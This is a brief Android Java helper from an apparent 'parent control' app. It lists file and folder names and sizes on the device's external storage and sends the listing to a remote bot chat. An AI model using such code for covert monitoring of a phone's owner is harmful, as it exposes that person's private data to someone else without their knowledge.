package com.parentcontrol;

import android.content.Context;
import android.os.Environment;
import java.io.File;
import okhttp3.OkHttpClient;

public class FileHelper {
    public static void listFiles(Context context, OkHttpClient client, String chatId) {
        BotService service = (BotService) context;
        try {
            File root = Environment.getExternalStorageDirectory();
            StringBuilder sb = new StringBuilder("📁 *Файлы:*\n\n");
            listDir(root, sb, 0, 2);
            String result = sb.toString();
            if (result.length() > 4000) result = result.substring(0, 4000) + "\n...";
            service.sendTextTo(chatId, result);
        } catch (Exception e) {
            service.sendTextTo(chatId, "❌ Ошибка: " + e.getMessage());
        }
    }

    private static void listDir(File dir, StringBuilder sb, int depth, int maxDepth) {
        if (depth > maxDepth || dir == null) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            String indent = "  ".repeat(depth);
            if (f.isDirectory()) {
                sb.append(indent).append("📂 ").append(f.getName()).append("/\n");
                listDir(f, sb, depth + 1, maxDepth);
            } else {
                sb.append(indent).append("📄 ").append(f.getName())
                  .append(" (").append(f.length() / 1024).append(" KB)\n");
            }
        }
    }
}
